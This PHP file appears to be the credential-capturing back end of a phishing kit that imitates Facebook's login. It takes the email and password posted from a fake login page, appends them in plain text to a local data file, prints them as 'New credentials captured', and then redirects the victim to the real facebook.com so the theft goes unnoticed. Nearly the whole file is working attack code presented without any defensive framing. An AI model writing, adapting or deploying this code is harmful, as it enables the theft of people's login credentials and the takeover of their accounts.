<?php
// Check if form data is submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Save the data to a file
    $file = fopen("../data/facebook.txt", "a");
    fwrite($file, "Email: $email\nPassword: $password\n\n");
    fclose($file);

    // Print the data to the terminal
    echo "New credentials captured:\n";
    echo "Email: $email\n";
    echo "Password: $password\n\n";

    // Redirect to the real Facebook login page
    header("Location: https://facebook.com");
    exit();
} else {
    // If the form isn't submitted, redirect to the phishing page
    header("Location: ../templates/facebook/index.html");
    exit();
}
?>